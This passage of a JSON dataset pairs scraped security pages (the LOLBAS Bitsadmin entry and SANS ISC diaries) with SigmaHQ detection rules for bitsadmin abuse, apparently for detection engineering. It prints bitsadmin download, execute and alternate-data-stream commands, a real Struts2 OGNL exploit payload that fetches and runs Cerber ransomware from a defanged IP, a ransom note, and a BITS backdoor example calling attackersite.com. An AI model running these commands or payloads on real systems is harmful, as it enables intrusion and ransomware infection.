whitelisting (for example using Software Restriction Policies, available in ALL editions of Windows XP and later versions) to deny execution in %USERPROFILE% (and all other locations unprivileged users can write too) put their users at trivially avoidable risk.\n\n**Anonymous**\nApr 6th 2017",
    "sigma_rule": {
      "title": "File Download Via Bitsadmin To A Suspicious Target Folder",
      "id": "2ddef153-167b-4e89-86b6-757a9e65dcac",
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file to a suspicious target folder",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-05-30",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_folder": {
          "CommandLine|contains": [
            ":\\Perflogs",
            ":\\ProgramData\\",
            ":\\Temp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\",
            "\\AppData\\Local\\Temp\\",
            "\\AppData\\Roaming\\",
            "\\Desktop\\",
            "%ProgramData%",
            "%public%"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_susp_targetfolder.yml",
    "id": "71"
  },
  {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
    "markdown": "# /Bitsadmin.exe\n\n- Alternate data streams\n- Download\n- Copy\n- Execute\n\nUsed for managing background intelligent transfer\n\n## Paths:\n- C:\\Windows\\System32\\bitsadmin.exe\n- C:\\Windows\\SysWOW64\\bitsadmin.exe\n\n## Resources:\n- https://www.slideshare.net/chrisgates/windows-attacks-at-is-the-new-black-26672679\n- https://www.youtube.com/watch?v=_8xJaaQlpBo\n- https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\n\n## Detections:\n- Sigma: proc_creation_win_bitsadmin_download.yml\n- Sigma: proxy_ua_bitsadmin_susp_tld.yml\n- Sigma: proc_creation_win_bitsadmin_potential_persistence.yml\n- Splunk: bitsadmin_download_file.yml\n- IOC: Child process from bitsadmin.exe\n- IOC: bitsadmin creates new files\n- IOC: bitsadmin adds data to alternate data stream\n\n## Alternate data streams\n### Create a bitsadmin job\n1. Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job.\n   ```\n   bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1\n   ```\n   - **Use case**: Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique.\n   - **Privileges required**: User\n   - **Operating systems**: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique**: T1564.004: NTFS File Attributes\n\n## Download\n### Create a bitsadmin job\n1. Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.\n   ```\n   bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1\n   ```\n   - **Use case**: Download file from Internet\n   - **Privileges required**: User\n   - **Operating systems**: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique**: T1105: Ingress Tool Transfer\n\n## Copy\n### Command for copying cmd.exe\n1. Command for copying cmd.exe to another folder\n   ```\n   bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset\n   ```\n   - **Use case**: Copy file\n   - **Privileges required**: User\n   - **Operating systems**: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10\n   - **ATT&CK® technique**: T1105: Ingress Tool Transfer\n\n## Execute\n### Create a bitsadmin job\n1. One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.\n   ```\n   bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset\n   ```\n   - **Use case**: Execute binary file specified. Can be used as a defensive evasion.\n   - **Privileges required**: User\n   - **Operating systems**: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10\n   - **ATT&CK® technique**: T1218: System Binary Proxy Execution",
    "sigma_rule": {
      "title": "File Download Via Bitsadmin To A Suspicious Target Folder",
      "id": "2ddef153-167b-4e89-86b6-757a9e65dcac",
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file to a suspicious target folder",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-05-30",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_folder": {
          "CommandLine|contains": [
            ":\\Perflogs",
            ":\\ProgramData\\",
            ":\\Temp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\",
            "\\AppData\\Local\\Temp\\",
            "\\AppData\\Roaming\\",
            "\\Desktop\\",
            "%ProgramData%",
            "%public%"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_susp_targetfolder.yml",
    "id": "72"
  },
  {
    "url": "https://isc.sans.edu/diary/22264",
    "markdown": "# Internet Storm Center\n\n## Threat Level:\ngreen\n\n---\n\n# Java Struts2 Vulnerability Used To Install Cerber Crypto Ransomware\n\n**Published**: 2017-04-06.\n**Last Updated**: 2017-04-06\n\n1 comment(s)\n\n---\n\nWe do have a special webcast about the Struts2 Vulnerability scheduled for 11am ET today. Sign up here.\n\nSince about a month, we are tracking numerous attempts to exploit the Java Struts2 vulnerability (CVE-2017-5638). Typically, the exploits targeted Unix systems with simple Perl backdoors and bots. But recently, I saw a number of exploit attempts targeting Windows systems using a variant of the Cerber ransomware.\n\n```\n%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='\n<strong>\n<span style=\"color:#c0392b\">\nBITSAdmin.exe /Transfer JOB hxxp://82[.]165[.]129[.]119/UnInstall.exe %TEMP%/UnInstall.exe &amp; %TEMP%/UnInstall.exe\n</span>\n</strong>\n').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n```\n\nThe command executed by the exploit as shown above:\n1. The script uses BITSAdmin to download the malware (I obfuscated the URL above).\n2. The malware (\"UnInstall.exe\") is saved in the %TEMP% directory.\n3. Finally, the malware is executed.\n\nVirustotal shows pretty good coverage for this malware by now:\n\n```image\nAlt: Malware Coverage\nDescription: The image displays a VirusTotal analysis result for a file named 'UnInstall.exe'. It includes the SHA256 hash of the file, the detection ratio indicating that 24 out of 61 antivirus engines flagged the file as malicious, and the analysis date showing it was performed on April 6, 2017, at 01:53:09 UTC. The layout is typical for VirusTotal, featuring a logo at the top and a structured presentation of the analysis data.\nTranscription: |\n  SHA256: c17ee78f87a376086901791ac1b60d0bbe13f78a023882576bec7e00aceffac6\n  File name: UnInstall.exe\n  Detection ratio: 24 / 61\n  Analysis date: 2017-04-06 01:53:09 UTC (0 minutes ago)\n```\n\nThe malware reaches out to btc.blockr.io to retrieve a bitcoin wallet address for the money transfer. Encrypted files are renamed using random (encrypted) file names.\n\n```image\nAlt: Malware Execution\nDescription: The image displays a ransom note from the Cerber ransomware on a Windows 10 interface. The note informs the victim that their files have been encrypted and provides instructions on how to recover them. Key points include: the necessity of obtaining a private key and decryption program, steps to download the Tor Browser, and a link to access a personal recovery page on the dark web. The ransom note is prominently displayed in red text against a grey background, emphasizing the urgency and severity of the situation.\nTranscription: |\n  CERBER RANSOMWARE\n  \n  Instructions\n  \n  YOUR DOCUMENTS, PHOTOS, DATABASES AND OTHER IMPORTANT FILES HAVE BEEN ENCRYPTED!\n  \n  The only way to decrypt your files is to receive the private key and decryption program.\n  \n  To receive the private key and decryption program go to any decrypted folder - inside there is the special file (*_READ_THIS_FILE_* ) with complete instructions how to decrypt your files.\n  \n  If you cannot find any (*_READ_THIS_FILE_* ) file at your PC, follow the instructions below:\n  \n  1. Download \"Tor Browser\" from https://www.torproject.org/ and install it.\n  2. In the \"Tor Browser\" open your personal page here:\n     http://p27d0khpz2n7nvgr.onion/A234-1CF9-1011-0098-7BF3\n     Note! This page is available via \"Tor Browser\" only.\n  \n  Any attempts to recover files without paying will result in permanent data loss!\n```\n\n---\n\n## Comments\n\n[quote]\nThe command executed by the exploit as shown above:\n1. The script uses BITSAdmin to download the malware (I obfuscated the URL above).\n2. The malware (\"UnInstall.exe\") is saved in the %TEMP% directory.\n3. Finally, the malware is executed.\n[/quote]\n\nAs usual, pretty harmless! Only Windows administrators who still have not employed whitelisting (for example using Software Restriction Policies, available in ALL editions of Windows XP and later versions) to deny execution in %USERPROFILE% (and all other locations unprivileged users can write too) put their users at trivially avoidable risk.\n\n**Anonymous**\nApr 6th 2017",
    "sigma_rule": {
      "title": "File Download Via Bitsadmin To An Uncommon Target Folder",
      "id": "6e30c82f-a9f8-4aab-b79c-7c12bce6f248",
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file to uncommon target folder",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-02-15",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_folder": {
          "CommandLine|contains": [
            "%AppData%",
            "%temp%",
            "%tmp%",
            "\\AppData\\Local\\",
            "C:\\Windows\\Temp\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_uncommon_targetfolder.yml",
    "id": "75"
  },
  {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
    "markdown": "# /Bitsadmin.exe\n\n- Alternate data streams\n- Download\n- Copy\n- Execute\n\nUsed for managing background intelligent transfer\n\n## Paths:\n- C:\\Windows\\System32\\bitsadmin.exe\n- C:\\Windows\\SysWOW64\\bitsadmin.exe\n\n## Resources:\n- https://www.slideshare.net/chrisgates/windows-attacks-at-is-the-new-black-26672679\n- https://www.youtube.com/watch?v=_8xJaaQlpBo\n- https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\n\n## Detections:\n- Sigma: proc_creation_win_bitsadmin_download.yml\n- Sigma: proxy_ua_bitsadmin_susp_tld.yml\n- Sigma: proc_creation_win_bitsadmin_potential_persistence.yml\n- Splunk: bitsadmin_download_file.yml\n- IOC: Child process from bitsadmin.exe\n- IOC: bitsadmin creates new files\n- IOC: bitsadmin adds data to alternate data stream\n\n## Alternate data streams\n### Create a bitsadmin job\n1. Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job.\n   ```\n   bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1\n   ```\n   - **Use case**: Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique.\n   - **Privileges required**: User\n   - **Operating systems**: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique**: T1564.004: NTFS File Attributes\n\n## Download\n### Create a bitsadmin job\n1. Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.\n   ```\n   bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1\n   ```\n   - **Use case**: Download file from Internet\n   - **Privileges required**: User\n   - **Operating systems**: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique**: T1105: Ingress Tool Transfer\n\n## Copy\n### Command for copying cmd.exe\n1. Command for copying cmd.exe to another folder\n   ```\n   bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset\n   ```\n   - **Use case**: Copy file\n   - **Privileges required**: User\n   - **Operating systems**: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10\n   - **ATT&CK® technique**: T1105: Ingress Tool Transfer\n\n## Execute\n### Create a bitsadmin job\n1. One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.\n   ```\n   bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset\n   ```\n   - **Use case**: Execute binary file specified. Can be used as a defensive evasion.\n   - **Privileges required**: User\n   - **Operating systems**: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10\n   - **ATT&CK® technique**: T1218: System Binary Proxy Execution",
    "sigma_rule": {
      "title": "File Download Via Bitsadmin To An Uncommon Target Folder",
      "id": "6e30c82f-a9f8-4aab-b79c-7c12bce6f248",
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file to uncommon target folder",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-02-15",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_folder": {
          "CommandLine|contains": [
            "%AppData%",
            "%temp%",
            "%tmp%",
            "\\AppData\\Local\\",
            "C:\\Windows\\Temp\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_uncommon_targetfolder.yml",
    "id": "76"
  },
  {
    "url": "https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394",
    "markdown": "# Internet Storm Center\n\n## Wipe the drive! Stealthy Malware Persistence Mechanism - Part 1\n\n**Published**: 2013-03-13.\n**Last Updated**: 2013-03-13 03:12:46 UTC\n\nAt Shmoocon 2013, Jake Williams (@MalwareJake) and I gave a presentation entitled “Wipe the Drive”. The point of the presentation was that you should always wipe the drive and reinstall the OS after a confirmed malware infection. We all know wiping the drive is the safest move, but there are business pressures to simply remove the known malware and move on. Also, because we are security professionals, there is often an expectation that we are able to remove all the malware. But, in my and Jake’s opinion, relying on a “clean scan” from antivirus products isn’t the best approach. The time and effort required to accurately analyze the capabilities of malware and conduct forensic analysis to determine if those capabilities were used is usually not in the cards. There is always an element of risk management, but whenever you possibly can, just wipe the drive.\n\nTo illustrate the point, we began developing a list of ways that malware or an active attacker on your computer can make small configuration changes to your machine. The changes create a misconfiguration that makes the target exploitable or sets events in motion that will cause the target to automatically get re-compromised in the future. There are a very large number of changes and misconfigurations that attackers can make, but our talk focused around eight of them. The only criteria for these techniques is that they launch a process in an unusual way and ideally don’t have any processes running (so you can avoid detection by memory forensics). I will discuss a few of the methods we came up with and how you might detect these changes. First, let’s talk about file extension hijacking.\n\n### TECHNIQUE #1 - File Associations Hijacking\n\nWhat happens when you click on a `.TXT` file? The operating system checks the `HKEY_CLASSES_ROOT` hive for the associated extension to see what program it should launch. Here we see the association for `.TXT` files mapped to “txtfile”.\n\n```image\nAlt: File Associations\nDescription: The image is a screenshot of a Windows Registry Editor displaying the registry settings for the `.txt` file extension. It shows the `HKEY_CLASSES_ROOT` hive with specific entries related to `.txt` files, including the `(Default)` value indicating the associated class for `.txt` files as `txtfile`, the `Content Type` set to `text/plain`, and the `PerceivedType` set to `text`. This visual representation is relevant to understanding how file associations are configured in the Windows operating system, which is a key aspect of the discussed malware persistence technique.\nTranscription: |\n  Computer\\HKEY_CLASSES_ROOT\\.txt\n  Name             Type      Data\n  (Default)        REG_SZ    txtfile\n  Content Type     REG_SZ    text/plain\n  PerceivedType    REG_SZ    text\n```\n\nFurther down in the `HKEY_CLASSES_ROOT` hive, we find the entry for “txtfile” where the applications that are used to “open” and “print” are defined. Here you can see that `NOTEPAD.EXE` is the application that will launch when the OS tries to open a `.TXT` file.\n\n```image\nAlt: Notepad Association\nDescription: The image shows a screenshot of the Windows Registry Editor, specifically focusing on the file association for `.TXT` files. The displayed path is `HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command`, illustrating the command associated with opening text files. The entry shows that the default command is set to launch `NOTEPAD.EXE` when a `.TXT` file is opened. This is relevant to the context of malware persistence, as it highlights how an attacker could manipulate this registry entry to redirect the opening of `.TXT` files to a malicious executable instead.\nTranscription: |\n  Computer\\HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command\n  Name: (Default)\n  Type: REG_EXPAND_SZ\n  Data: %SystemRoot%\\system32\\NOTPAD.EXE %1\n```\n\nWhat if the attacker or his malware changes this association? Instead of launching `notepad.exe`, it tells the OS to launch `NOTPAD.EXE`. `NOTPAD.EXE` is a wrapper around the real `NOTEPAD.EXE`, but it also contains a malicious payload. During the initial infection, the attacker makes this change and leaves his `NOTPAD.EXE` behind. You remove the initial attack vector and do memory forensics to find nothing running on the host. Sometime later, after memory of the incident fades, the administrator checks his logs by clicking on a `.TXT` file. It launches `NOTPAD.EXE`, which in turn launches `NOTEPAD.EXE` and reinfects the machine.\n\nIn an alternate version of this attack, a new file extension is created, such as `.WTD`. When the attacker is ready to reinfect you, they send an email with a `.WTD` extension. When it is opened on the victim’s machine, they are reinfected.\n\nSome might say, “but `NOTPAD.EXE` will be detected by AV”. Perhaps, but remember the point of these techniques is to evade memory forensics. For the most part, evading antivirus software is trivial.\n\n#### Detection:\n\nHow do you detect this? Baseline the contents of your `HKEY_CLASSES_ROOT` registry key and then periodically check its current state against that baseline. Investigate any changes to see what executes when you click on the file extensions that have changed. We all know it is dangerous to click links on the internet. Unfortunately, links on your computer aren’t any safer once an attacker has had a chance to change where they go.\n\n---\n\n### TECHNIQUE #2 - BITS Backdoor\n\nBITS is the Background Intelligent Transfer System. This service is used by your operating system to download patches from Microsoft or your local WSUS server. But this service can also be used to schedule the download of an attacker’s malware to reinfect your system. Once the attacker or his malware is on your machine, he executes `BITSADMIN` to schedule the download of `http://attackersite.com/malware.exe`. He schedules the job to retry the URL once a day and automatically execute the program after it is successfully downloaded. The attacker doesn’t put anything at that URL today. Instead, he simply waits for you to finish your incident handling process and look the other way. You can scan the machine with 100 different virus scanners. Today, there is no file on your system to detect. You can do memory forensics all day. Sorry, there is nothing running today. Today, it is just a simple configuration change to the OS. Then, when he is ready, he places `malware.exe` on his site. Your machine dutifully downloads the new malware and executes it.\n\n#### Detection:\n\nThis one is easier to find. The `BITSADMIN` tool also lets you view scheduled downloads. You can get a list of scheduled tasks with the command `BITSADMIN /LIST`.\n\n```image\nAlt: BITSADMIN List\nDescription: The image displays a command prompt window showing the output of the command `bitsadmin /list`. It indicates that the BITSADMIN version is 3.0 and provides details about a scheduled job named 'getsome'. The job is currently in a suspended state and is associated with a unique identifier. The output also includes a warning that BITSADMIN is deprecated and suggests that newer administrative tools for the BITS service are available via PowerShell.\nTranscription: |\n  C:\\>bitsadmin /list\n  \n  BITSADMIN version 3.0 [ 7.5.7601 ]\n  BITS administration utility.\n  (C) Copyright 2000-2006 Microsoft Corp.\n  \n  BITS is deprecated and is not guaranteed to be available in future versions of Windows.\n  Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.\n  {42D36E8B-607A-40A3-B224-6671722F21BE} 'getsome' SUSPENDED 0 / 1 / UNKNOWN\n  Listed 1 job(s).\n  C:\\>\n```\n\nHere you can see there is a job called “getsome” that is currently scheduled on this machine. `BITSADMIN /LISTFILES <jobname>` takes a scheduled job as a parameter and returns a list of URLs the job is scheduled to download. For example, here we see that job “getsome” is scheduled to download from the URL `http://attackerssite.com/malware.exe` and it will save the file as `c:\\temp\\malware.exe`.\n\n```image\nAlt: BITSADMIN List Files\nDescription: The image depicts a command prompt window showing the output of the command `bitsadmin /listfiles getsome`. It indicates the version of BITSADMIN (3.0), copyright information, and a deprecation warning for the BITS service. The output lists a scheduled task named 'getsome' that is set to download a file from 'http://attackersite.com/malware.exe' and save it to 'c:\\temp\\malware.exe'. It also notes that 1 file is listed.\nTranscription: |\n  C:\\temp>bitsadmin /listfiles getsome\n  \n  BITSADMIN version 3.0 [ 7.5.7601 ]\n  BITS administration utility.\n  (C) Copyright 2000-2006 Microsoft Corp.\n  \n  BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.\n  Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.\n  \n  0 / UNKNOWN WORKING http://attackersite.com/malware.exe -> c:\\temp\\malware.exe\n  Listed 1 file(s).\n  \n  C:\\temp>\n```\n\nBut how does the malware execute after it is downloaded? BITS will allow you to schedule a command to execute after a successful download to notify you that the job is finished. The intention is that you can execute a program and have it send you an email or fire an alert in a network monitoring system. Let’s check the notification program on this program with `BITSADMIN /GETNOTIFYCMDLINE <jobname>`. To use it, provide the job name as an argument like this:\n\n```image\nAlt: BITSADMIN Notify\nDescription: The image shows a screenshot of a command prompt window displaying the output of the command `bitsadmin /getnotifycmdline getsome`. It indicates the version of BITSADMIN being used and confirms that it is deprecated. The output also reveals that the notification command line for the scheduled job named 'getsome' is set to execute `c:\\temp\\malware.exe` with a 'NULL' parameter, suggesting that this malware will run automatically after being downloaded.\nTranscription: |\n  C:\\temp>bitsadmin /getnotifycmdline getsome\n  BITSADMIN version 3.0 [ 7.5.7601 ]\n  (C) Copyright 2000-2006 Microsoft Corp.\n  BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.\n  Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.\n  the notification command line is 'c:\\temp\\malware.exe' 'NULL'\n  C:\\temp>\n```\n\nHere you can see that after the malware is successfully downloaded to `c:\\temp\\malware.exe`, the BITS service will launch `c:\\temp\\malware.exe` “to notify the administrator”.\n\n---\n\n### SUMMARY:\n\nAdd checking the `BITSADMIN` queue to your incident response checklist. If you find something scheduled, don’t rely on simply deleting the job. In a moderately complex operating system, there are an infinite number of places to hide. I'll talk about more of these types of techniques during my upcoming handler shifts. When you have malware on your machine, just wipe the drive.\n\nHere is an AWESOME DEAL on some SANS training. Join Justin Searle and I for SANS new SEC573 Python for Penetration Testers course at SANSFire June 17-21. It is a BETA, so the course is 50% off! Sign up today!\n\nhttp://www.sans.org/event/sansfire-2013/course/python-for-pen-testers\n\nThere are two opportunities to join Jake Williams for FOR610 Reverse Engineering Malware. Join him on vLive with Lenny Zeltser or at the Digital Forensics & Incident Response Summit in Austin.\n\nvLive with Jake and Lenny begins March 28th, 2013:\nhttp://www.sans.org/vlive/details/for610-mar-2013-jake-williams\n\nJake at DFIR Austin Texas July 11-15, 2013:\nhttp://www.sans.org/event/dfir-summit-2013/course/reverse-engineering-malware-malware-analysis-tools-techniques\n\n---\n\n**Keywords**: Malware controls",
    "sigma_rule": {
      "title": "Monitoring For Persistence Via BITS",
      "id": "b9cbbc17-d00d-4e3d-a827-b06d03d2380d",
      "status": "test",
      "description": "BITS will allow you to schedule a command to execute after a successful download to notify you that the job is finished.\nWhen the job runs on the system the command specified in the BITS job will be executed.\nThis can be abused by actors to create a backdoor within the system and for persistence.\nIt will be chained in a BITS job to schedule the download of malware/additional binaries and execute the program after being downloaded.\n",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/",
        "http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html",
        "https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394"
      ],
      "author": "Sreeman",
      "date": "2020-10-29",
      "modified": "2024-01-25",
      "tags": [
        "attack.defense-evasion",
        "attack.t1197"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_cli_notify_1": {
          "CommandLine|contains": "/SetNotifyCmdLine"
        },
        "selection_cli_notify_2": {
          "CommandLine|contains": [
            "%COMSPEC%",
            "cmd.exe",
            "regsvr32.exe"
          ]
        },
        "selection_cli_add_1": {
          "CommandLine|contains": "/Addfile"
        },
        "selection_cli_add_2": {
          "CommandLine|contains": [
            "http:",
            "https:",
            "ftp:",
            "ftps:"
          ]
        },
        "condition": "selection_img and (all of selection_cli_notify_* or all of selection_cli_add_*)"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_potential_persistence.yml",
    "id": "80"
  },
  {
    "url": "https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/",
